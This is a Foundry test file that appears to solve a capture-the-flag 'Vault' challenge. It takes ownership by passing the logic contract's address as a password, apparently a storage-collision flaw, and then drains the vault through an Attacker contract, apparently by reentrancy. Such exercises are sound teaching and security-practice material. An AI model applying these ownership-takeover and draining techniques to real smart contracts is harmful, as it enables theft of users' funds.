// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Script, console} from "forge-std/Script.sol";
import "../src/Vault.sol";
import "../src/Attacker.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;
    Attacker public attacker;

    address owner = address(1);
    address palyer = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));
        vault.deposite{value: 0.1 ether}();

        vm.stopPrank();

        vm.startPrank(palyer);
        attacker = new Attacker(address(vault), palyer);
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 0.1 ether);

        vm.startPrank(palyer);
        // change owner to player
        bytes32 password = bytes32(uint256(uint160(address(logic))));
        console.logBytes32(password);
        console.log("callChangeOwner before");
        attacker.callChangeOwner(password, palyer);

        vault.openWithdraw();
        // transfer balance to player
        attacker.attack{value: 0.1 ether}();

        require(vault.isSolve(), "solved");
        assertEq(0.2 ether, attacker.getBalance());
        vm.stopPrank();
    }
}
